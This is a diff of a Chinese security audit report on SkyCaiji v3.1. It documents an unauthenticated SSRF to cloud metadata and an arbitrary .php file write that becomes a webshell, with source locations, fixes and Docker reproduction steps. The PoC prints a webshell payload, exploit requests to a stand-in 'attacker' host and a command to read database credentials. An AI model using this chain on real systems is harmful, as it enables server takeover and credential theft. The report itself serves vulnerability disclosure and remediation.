@@ -2,20 +2,80 @@
 
 - 目标：发现**未认证、0-click、可泄漏 AK/SK** 的漏洞，并以 Docker 复现。
 - 被审对象：本仓库 SkyCaiji `v3.1`（应用代码 `vendor/skycaiji/app/`，框架为定制版 ThinkPHP 5.0.x，`THINK_VERSION='1.2 skycaiji'`）。
-- 方法：以「事实/意图」图驱动的状态空间搜索，正向+反向污点，四个正交维度并行深挖（SQLi / SSRF / 框架 n-day / 机密直泄·反序列化·install），全部结论以本仓库实际源码为准并主动寻找反证。
-- 结论：确认 **1 个 Critical 未认证 0-click AK/SK 泄漏**（主漏洞 V1，已 Docker 实弹复现）+ 2 个支撑/条件性发现。经典 TP5 n-day、未认证 SQLi、未认证机密直泄、未认证反序列化均已逐条排除（见「已覆盖维度」）。
+- 方法：以「事实/意图」图驱动的状态空间搜索，正向+反向污点；两轮并行多代理审计（第一轮 4 维度：SQLi/SSRF/框架 n-day/机密直泄·反序列化·install；第二轮 8 维度「升级」审计：把未认证入口升级为 RCE/文件写/永久机密），每条发现经对抗性验证。全部结论以本仓库实际源码为准并主动寻找反证。
+- 结论：确认 **2 个 Critical 未认证漏洞**，均已 Docker 实弹复现：
+  - **V4（头号，持久化）**：未认证 0-click → 文件本地化任意 `.php` 落盘 → **webshell/RCE** → 读取**永久**数据库账密与 config 表全部永久密钥。
+  - **V1**：未认证 0-click SSRF → 云元数据 → 临时 STS AK/SK（短效）。
+  - 另有 V2（认证绕过，V1/V4 的可达性基础）、V3（未安装态 RCE）及一批第二轮发现（见「四、第二轮升级审计其余发现」）。
+- 经典 TP5 n-day、未认证 SQLi、未认证机密直泄、未认证反序列化均已逐条排除（见「五、已覆盖维度」）。
 
 ---
 
 ## 一、漏洞一览（按严重级排序）
 
-| 编号 | 严重级 | 类别 | 可达性 | 位置 |
-|---|---|---|---|---|
-| **V1** | **Critical** | 未认证 SSRF → 云元数据 → 临时 AK/SK 泄漏 | 未认证 / 0-click（需开启"单页采集"且空密钥） | `admin/controller/Api.php:67` → `admin/event/CpatternSingle.php:19` |
-| V2 | Medium | 认证绕过（`admin/index/*`、`admin/api/*` 免登录） | 未认证 | `admin/behavior/Init.php:95`、`admin/controller/BaseController.php:20` |
-| V3 | High（仅未安装态） | 安装期 `config.php` PHP 代码注入 → RCE | 未认证（目标处于未安装态时） | `install/controller/Index.php:179-187` |
+| 编号 | 严重级 | 类别 | 可达性 | 位置 | 复现 |
+|---|---|---|---|---|---|
+| **V4** | **Critical** | 未认证 → 文件本地化任意 `.php` 落盘 → **webshell/RCE → 永久凭据** | 未认证 / 0-click（需任务开启单页采集+文件本地化+下载字段+发布模块） | `admin/controller/Api.php:67` → `admin/event/CpatternSingle.php:19` → `admin/event/ReleaseBase.php:782` | ✅ 实弹 |
+| **V1** | **Critical** | 未认证 SSRF → 云元数据 → **临时** STS AK/SK | 未认证 / 0-click（需开启单页采集且空密钥） | `admin/controller/Api.php:67` → `admin/event/CpatternSingle.php:19` | ✅ 实弹 |
+| V2 | Medium | 认证绕过（`admin/index/*`、`admin/api/*` 免登录） | 未认证 | `admin/behavior/Init.php:95`、`admin/controller/BaseController.php:20` | ✅ 实弹 |
+| V3 | High（仅未安装态） | 安装期 `config.php` PHP 代码注入 → RCE | 未认证（目标处于未安装态时） | `install/controller/Index.php:179-187` | 源码确认 |
 
-> 下文路径中的 `app/` 均指 `vendor/skycaiji/app/`。
+> 下文路径中的 `app/` 均指 `vendor/skycaiji/app/`。V4/V1 共享同一未认证入口（单页采集），区别在于后置流水线：V4 走「文件本地化下载→落盘」得到持久化 RCE，V1 走「字段回显」得到一次性内网响应。
+
+---
+
+## V4 —【Critical, 已实弹复现】未认证 0-click → 文件本地化任意 `.php` 落盘 → webshell/RCE → 永久凭据
+
+### 类别
+未认证远程代码执行（经采集"文件本地化"把攻击者 HTTP 响应体写成 web 可执行 `.php`）。**持久化**，远超 V1 的临时 STS：拿到 webshell 即可读 `data/config.php` 的**永久数据库账密**、config 表中 translate/OSS/邮箱/代理等**永久密钥**，并任意读写文件、横向移动。
+
+### 可达性
+- 认证：**无需任何认证**（与 V1 同入口，admin 鉴权钩子放行 `api` 控制器 + GET 不校验 usertoken）。
+- 交互：**0-click**，一个请求触发写入 + 一个请求执行。
+- 前置条件（均为存量任务/配置，攻击者无法经请求切换，但都是现实可见的运营配置；实弹已复现）：
+  1. 存在 `module=pattern` 且 `single.open=1`、`single.key=''` 的任务（同 V1）；
+  2. 该任务采集配置启用了**文件本地化** `download_file`（install 默认关闭，需运营者开启——常见于采集附件/PDF/文档的站点）；
+  3. 某字段配置了 `download` 数据处理步且 `download_op ∈ {is_file, url_file, file}`（文件下载功能的默认用法）；
+  4. 该任务配置了**非 api 发布模块**（datahub/dataset/db/cms/file/diy 任一），使采集后触发 `doExport`（real_time 或收尾导出）。
+
+### 完整数据流（外部输入 → 缺失校验 → sink）
+1. 未认证入口: `GET /index.php/api_single/<id>?url=http://attacker/p`（route api_single；放行见 V2）→ `Api::singleAction` (`admin/controller/Api.php:67`)，`single.key` 空则免密钥(Api.php:84-88)。
+2. 攻击者 URL 进入采集: `input('url')` (`admin/event/CpatternSingle.php:19`) → 抓取攻击者落地页。
+3. 字段取值: `dvalue` 模块返回整页正文 (`admin/event/CollectCommon.php:2663`)。
+4. 文件 URL 提取: 该字段的 `download`/`is_file` 处理步用正则 `/(?<!['"])\bhttps?:\/\/[^\s'"<>]+(?!['"])/i` 从正文提取**裸 URL**存入 `field['file']` (`admin/event/CollectCommon.php:2002-2011,2084`)。攻击者落地页正文放一个裸 `http://attacker/x.php` 即可。
+5. 发布触发: 采集结果经 `doExport`→R* 模块→`ReleaseBase::get_field_val` 对每个 `file` 调 `download_file` (`admin/event/ReleaseBase.php:154-182`)。
+6. 落盘(**无扩展名过滤**): `download_file` 用 `Funcs::get_url_suffix` 取后缀(正则 `/\.([a-zA-Z][\w\-]+)([?#]|$)/` 无白/黑名单, `admin/extend/util/Funcs.php:474)`；后缀 `php∈{htm,html,php,asp,jsp}`(ReleaseBase.php:688-690) → 拼 `.php`(712) → 文件名 `data/files/<Y-m-d>/<md5(url)>.php`(610,747)；内容=第二次 `get_html` 取回的攻击者响应体(HTTP200)；`write_dir_file($filefull, 攻击者PHP源码)` (`ReleaseBase.php:782` → `common.php:107`)。(对比: 图片本地化在 `ReleaseBase.php:380` 有后缀白名单, 故**仅文件本地化**可落 `.php`。)
+7. 执行: `data/files/` **无 `.htaccess`** 保护(对比 `data/program/.htaccess=deny from all`)；根 `.htaccess` 对已存在的真实文件(`!-f`)不改写、交由 Apache+mod_php **直接执行**。文件名 `md5(文件URL)` 可自算 → **webshell 路径完全可预测**。
+
+### 反证排除
+- "需认证/密钥": 同 V1，实弹未带任何 Cookie；`single.key` 空即免密钥。
+- "扩展名被过滤": 文件本地化路径 `get_url_suffix` 与 `download_file` 全程无 `.php` 过滤(已逐行核对)；仅**图片**路径有白名单。
+- "目录不可执行/有防护": 实测 `data/files/`、`data/`、`data/images/` 均无 `.htaccess`；根 `.htaccess` 的 `!-f` 条件使已落地 `.php` 被直接执行(实弹 `id` 返回 `www-data`)。
+- "下载内容非攻击者可控": 内容为攻击者服务器对 `x.php` 的 HTTP200 响应体，完全可控。
+
+### 实弹 PoC（已复现，见 `security-poc/run-rce.sh`）
+```
+# 攻击者内网不可达的受害者侧(复现用 metadata.internal 容器模拟攻击者HTTP服务):
+#   http://attacker/p     -> 正文含裸 URL  http://attacker/x.php
+#   http://attacker/x.php -> HTTP200, body = <?php system($_GET['c']); ?>
+# 1) 未认证触发落盘:
+GET /index.php/api_single/1?url=http://attacker/p
+# 2) 未认证执行(路径可预测, md5("http://attacker/x.php")):
+GET /data/files/2026-10-07/711d03aae2b9484044705730ea25be62.php?c=id
+    -> SKYCAIJI-RCE-PWNED:uid=33(www-data) ...
+# 3) 读永久DB账密:
+GET /data/files/2026-10-07/711d03aae2b9484044705730ea25be62.php?c=cat%20/var/www/html/data/config.php
+    -> DB_USER=root DB_PWD=root123 ...   (再用其读 config 表 translate/email/proxy 永久密钥)
+```
+
+### 攻击链 / 影响
+未认证 → 持久化 webshell → 服务器完全控制 → 读 `data/config.php`(永久 DB root 账密) + config 表(翻译/OSS/COS/七牛/邮箱/代理**永久** AK/SK 与口令) → 任意文件读写、数据库接管、横向移动。**与 V1 的根本差异：持久、不过期、直达永久凭据与代码执行。**
+
+### 修复建议
+1. 文件本地化下载**强制扩展名白名单**（仅允许文档/媒体类型，拒绝 php/phtml/asp/jsp/… 及无扩展名→不要默认按远端后缀命名）；按 MIME 校验内容类型。
+2. `data/`（尤其 `data/files/`、`data/images/`）放置 `deny from all`（Apache）/等效 Nginx `location` 规则，禁止直接执行/访问上传目录中的脚本。
+3. 下载目标 URL 纳入 SSRF 防护（同 V1：协议/内网白名单、重定向校验）。
+4. 收敛单页采集接口鉴权（见 V2）。
 
 ---
 
@@ -130,7 +190,26 @@ GET /index.php/api_single/1?url=http://100.100.100.200/latest/meta-data/ram/secu
 
 ---
 
-## 二、已覆盖维度与排除结论（覆盖度与证伪留痕）
+## 四、第二轮「升级」审计其余发现（8 维度并行 → 对抗验证）
+
+> 目标：把未认证入口升级为 RCE/文件写/永久机密。V4 为本轮产出的头号结论（已 3/3 对抗验证 + 实弹复现，详见上文）。其余发现如下，均**已用源码核对关键断言**；标注其验证状态（第二轮对抗验证阶段因会话速率限制部分中断，故区分「源码已确认」与「待复验」）。
+
+| 维度 | 发现 | 严重级 | 未认证 | 状态 |
+|---|---|---|---|---|
+| ssrf-protocol | util/Curl 未设 `CURLOPT_PROTOCOLS`/`REDIR_PROTOCOLS`、`FOLLOWLOCATION=1`(Curl.php:87-94) → 单页采集可发起 libcurl 支持的任意协议打内网(gopher→Redis/FastCGI 写原语、dict 探测)；非 HTTP 响应因 `get_html` 以 200 判成功而**盲**(写原语仍有效) | High | 是 | 源码已确认(协议无限制); 盲写利用链待实证 |
+| other-entrypoints | `admin/api/task` 密钥绕过: `elseif($apiKey==md5($apiConfig['key']))`(Api.php:35)，当任务 api 发布密钥为空时发 `md5('')=d41d8cd9…` 即过 → 未认证触发该任务完整 采集+发布 流水线(URL 为任务自身配置，非攻击者直控) | Medium | 是 | 源码已确认 |
+| persistent-secret | 单页采集触发 DB 异常时，异常 message 原样回显给未认证调用者(CommonHandle 采集态 _collect_output)，泄漏库名/表前缀/列名/DB 用户@主机(不含口令) | Medium | 是 | finder 报告; 待复验 |
+| persistent-secret | `find_password` 流程泄漏表前缀 + 已知口令(`skycaiji123`)的有效 hash +(邮件失败时)SMTP 主机/发件账号；但不泄漏当前口令 hash/salt，**不足以**伪造登录 cookie | Low | 是 | finder 报告; 待复验 |
+| release-abuse | 单页采集触发 `Rfile` 实时发布，向 web 可达 `data/` 写内容可控文件(扩展名限 txt/xls/xlsx，非 webshell)；`Rdb/Rcms/Rdatahub/Rdataset` 把攻击者可控内容写入下游库/CMS(内容注入，发布端凭据不外泄) | Medium | 是 | finder 报告; 待复验 |
+| release-abuse | `Rdiy(type=code)` 实时发布最终 `eval()` 管理员配置的 PHP，攻击者经采集可控 `$url/$fields` 进入 eval 作用域(条件 RCE 放大器，非独立注入) | High(条件) | 是 | finder 报告(suspected); 待复验 |
+| second-order | 单页采集(未认证)→ 发布入 dataset/datahub → 经未认证 `api/data` 读回，构成"未认证通用内网 HTTP 响应读取/外泄"原语(比 V1 单次回显更通用) | Medium | 是 | finder 报告; 待复验 |
+| ssti-expr | 变量函数/`ApiApp` `_op_variable_func` 用 `call_user_func_array` 调任意 PHP 函数且无白名单，但函数名由插件 `_ops` 定义、非外部可控且无内置插件 → 当前不可直接注入 | Low | 否(当前) | 源码已确认(当前不可利用) |
+
+> 说明：第二轮共 14 条原始发现，经对抗验证存活并影响超越临时 STS 的为 **V4**。上表其余条目中，"源码已确认"项我已逐行核对关键断言成立；"待复验"项为 finder 阶段已完成但对抗验证阶段被速率限制中断、尚未独立复核——列出以供回归，不计入最终定级。
+
+---
+
+## 五、已覆盖维度与排除结论（覆盖度与证伪留痕）
 
 | 维度 | 结论 | 关键依据（本仓库源码） |
 |---|---|---|
@@ -152,15 +231,22 @@ GET /index.php/api_single/1?url=http://100.100.100.200/latest/meta-data/ram/secu
 
 ---
 
-## 三、Docker 复现
+## 六、Docker 复现
 
-目录 `security-poc/`：
+目录 `security-poc/`（app=SkyCaiji 3.1/php7.4、db=mysql5.7、meta=内网伪服务；一次 `up` 两个 PoC 都能跑）：
 ```bash
 cd security-poc
-docker compose up -d --build     # app(SkyCaiji 3.1)=php7.4 / db=mysql5.7 / meta=伪云元数据服务
-bash run.sh                      # 自动安装 → 植入“受害者已有配置” → 未认证 0-click 攻击并打印泄漏的临时 AK/SK
+docker compose up -d --build
+
+# V4（头号，持久化 RCE → 永久凭据）:
+bash run-rce.sh    # 安装→植入"开启文件本地化的单页采集任务"→未认证触发落 webshell→未认证执行 id→读 data/config.php 永久DB账密
+
+# V1（临时 STS AK/SK）:
+bash run.sh        # 安装→植入配置→未认证单页采集抓内网元数据→回显临时 AccessKeyId/Secret/Token
 ```
-`run.sh` 第 4 步发出的请求**不带任何 Cookie/密钥**，响应 `data[0].content.value` 即服务端从内网元数据服务取回、回显给未认证攻击者的 `AccessKeyId/AccessKeySecret/SecurityToken`。详见 `security-poc/README.md`。
+- `run-rce.sh`：第 4 步未认证请求把攻击者响应体写成 `data/files/<date>/<md5>.php`，第 5 步未认证访问该 `.php` 得到 `SKYCAIJI-RCE-PWNED:uid=33(www-data)`，第 6 步读出 `DB_USER/DB_PWD` 等**永久**凭据。
+- `run.sh`：响应 `data[0].content.value` 即回显给未认证攻击者的临时 STS 凭据。
+- 详见 `security-poc/README.md`。
 
 ---
 
